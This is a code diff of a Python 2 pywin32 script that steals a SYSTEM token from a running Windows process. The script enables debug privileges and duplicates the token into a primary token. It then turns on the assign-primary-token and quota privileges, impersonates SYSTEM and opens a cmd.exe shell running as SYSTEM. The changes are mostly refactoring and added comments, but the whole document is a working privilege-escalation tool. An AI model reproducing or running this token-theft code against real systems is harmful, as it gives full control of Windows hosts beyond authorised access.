@@ -1,14 +1,17 @@
-import win32api, win32pdh, win32process,win32security, win32con, pywintypes, win32profile
+import win32api, win32pdh, win32process, win32security, win32con, win32profile
+import pywintypes
 
-def EnablePrivilege(privilegeStr):
-    PyhCP = win32security.OpenProcessToken(win32api.GetCurrentProcess(), priv_flags)
+def EnablePrivilege(privilegeStr, token = None):
+    """Enable Privilege on token, if no token is given the function gets the token of the current process."""
+    if token == None:
+        token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
+
     privilege_id = win32security.LookupPrivilegeValue(None, privilegeStr)
-    print privilege_id
-    old_privs = win32security.AdjustTokenPrivileges(PyhCP, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])
+    old_privs = win32security.AdjustTokenPrivileges(token, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])
+
 
 def procids():
     """Returns a list with all running processes and their pids."""
-    #each instance is a process, you can have multiple processes w/same name
     junk, instances = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
     proc_ids=[]
     proc_dict={}
@@ -21,10 +24,10 @@ def procids():
 
     for instance, max_instances in proc_dict.items():
         for inum in xrange(max_instances+1):
-            hq = win32pdh.OpenQuery() # initializes the query handle 
+            hq = win32pdh.OpenQuery()
             path = win32pdh.MakeCounterPath( (None,'process',instance, None, inum,'ID Process') )
             counter_handle=win32pdh.AddCounter(hq, path) 
-            win32pdh.CollectQueryData(hq) #collects data for the counter 
+            win32pdh.CollectQueryData(hq)
             type, val = win32pdh.GetFormattedCounterValue(counter_handle, win32pdh.PDH_FMT_LONG)
             proc_ids.append((instance,str(val)))
             win32pdh.CloseQuery(hq) 
@@ -32,17 +35,19 @@ def procids():
     return [int(pid[1]) for pid in proc_ids]
 
 def GetLocalSystemProcessToken():
+    """Takes a list of pids and checks if the process has a token with SYSTEM user, if so it returns the token handle."""
     systemsid = win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, "nt authority\\system")[0])
-
-    PROCESS_QUERY_INFORMATION = win32con.PROCESS_QUERY_INFORMATION
+    
     tokenprivs = (win32con.TOKEN_QUERY | win32con.TOKEN_READ | win32con.TOKEN_IMPERSONATE | win32con.TOKEN_QUERY_SOURCE | win32con.TOKEN_DUPLICATE | win32con.TOKEN_ASSIGN_PRIMARY | win32con.TOKEN_EXECUTE)
 
     for pid in procids():
         try:
-            PyhProcess = win32api.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
-
+            PyhProcess = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)
             PyhToken = win32security.OpenProcessToken(PyhProcess, tokenprivs)
+##Get the token SID.
             sid = win32security.ConvertSidToStringSid(win32security.GetTokenInformation(PyhToken, win32security.TokenUser)[0])
+
+##If token SID is the SID of SYSTEM, return the token handle.
             if sid == systemsid:
                 win32api.CloseHandle(PyhProcess)
                 return PyhToken
@@ -50,55 +55,68 @@ def GetLocalSystemProcessToken():
             win32api.CloseHandle(PyhProcess)
 
         except pywintypes.error,e :
-            print str(e)
+            print "[!] Error:" + str(e[2])
 
 
-priv_flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
-
+##Enable SE_DEBUG_NAME(debugprivileges) on the current process.
+print "[+] Enabling SE_DEBUG_NAME"
 EnablePrivilege(win32security.SE_DEBUG_NAME)
 
+##Get a SYSTEM user token.
+print "[+] Retrieving SYSTEM token"
 PyhToken = GetLocalSystemProcessToken()
-PyhTokendupe = win32security.DuplicateTokenEx(PyhToken, win32security.SecurityImpersonation, win32con.MAXIMUM_ALLOWED, win32security.TokenPrimary, TokenAttributes=None)
+
+##Duplicate it to a Primary Token, so it can be passed to CreateProcess.
+print "[+] Duplicating token"
+PyhTokendupe = win32security.DuplicateTokenEx(
+                                            PyhToken,
+                                            win32security.SecurityImpersonation,
+                                            win32con.MAXIMUM_ALLOWED,
+                                            win32security.TokenPrimary,
+                                            TokenAttributes = None)
+##Now we have duplicated the token, we can close the orginal.
 win32api.CloseHandle(PyhToken)
 
-privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_ASSIGNPRIMARYTOKEN_NAME)
-print privilege_id
-old_privs = win32security.AdjustTokenPrivileges(PyhTokendupe, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])
+##Enable SE_ASSIGNPRIMARYTOKEN_NAME and SE_INCREASE_QUOTA_NAME, these are both needed to start a process with a token.
+print "[+] Enabling SE_ASSIGNPRIMARYTOKEN_NAME"
+EnablePrivilege(win32security.SE_ASSIGNPRIMARYTOKEN_NAME, token = PyhTokendupe)
 
-privilege_id = win32security.LookupPrivilegeValue(None, win32security.SE_INCREASE_QUOTA_NAME)
-print privilege_id
-old_privs = win32security.AdjustTokenPrivileges(PyhTokendupe, False, [(privilege_id, win32security.SE_PRIVILEGE_ENABLED)])
+print "[+] Enabling SE_INCREASE_QUOTA_NAME"
+EnablePrivilege(win32security.SE_INCREASE_QUOTA_NAME, token = PyhTokendupe)
 
+##Enable SE_IMPERSONATE_NAME, so that we can impersonate the SYSTEM token.
+print "[+] Enabling SE_IMPERSONATE_NAME"
 EnablePrivilege(win32security.SE_IMPERSONATE_NAME)
 
+print "[+] Impersonating token"
 win32security.ImpersonateLoggedOnUser(PyhTokendupe)
+print "[+] Running as: " + win32api.GetUserName()
 
-##EnablePrivilege(win32security.SE_ASSIGNPRIMARYTOKEN_NAME)
-##EnablePrivilege(win32security.SE_INCREASE_QUOTA_NAME)
+##Start the process with the token.
+try:
+    pi =  win32process.CreateProcessAsUser(
+                                            PyhTokendupe,
+                                            r"C:\Windows\System32\cmd.exe",
+                                            "/c @echo OFF && echo Running as: && whoami && pause && cmd",
+                                            None,
+                                            None,
+                                            True,
+                                            win32process.CREATE_NEW_CONSOLE,
+                                            None,
+                                            None,
+                                            win32process.STARTUPINFO())
+except pywintypes.error,e :
+    print "[!] Error:" + str(e[2])
 
 
-si = win32process.STARTUPINFO()
-si.wShowWindow = win32con.SW_SHOW
-si.dwFlags = win32con.STARTF_USESHOWWINDOW
+print "[+] Cleaning up: "
 
-dwFlags = win32process.CREATE_NEW_CONSOLE
-    
-##check if elevated
-print "Elevated: " + str(win32security.GetTokenInformation(PyhTokendupe, win32security.TokenElevationType) == True)
-print "Token user: " + win32security.ConvertSidToStringSid(win32security.GetTokenInformation(PyhTokendupe, win32security.TokenUser)[0])
-print "SYTEM SID: " + win32security.ConvertSidToStringSid(win32security.LookupAccountName(None, "nt authority\\system")[0])
-print "Running as: " + win32api.GetUserName()
-print win32security.GetTokenInformation(PyhTokendupe, win32security.TokenPrivileges)
+print "\t[+] Reverting to self"
+win32security.RevertToSelf()
+print "\t[+] Running as: " + win32api.GetUserName()
+
+print "\t[+] Closing Handle"
+win32api.CloseHandle(PyhTokendupe)
 
 
-win32process.CreateProcessAsUser(
-                                PyhTokendupe,
-                                r"C:\Windows\System32\cmd.exe",
-                                None,
-                                None,
-                                None,
-                                True,
-                                dwFlags,
-                                None,
-                                None,
-                                si)
+
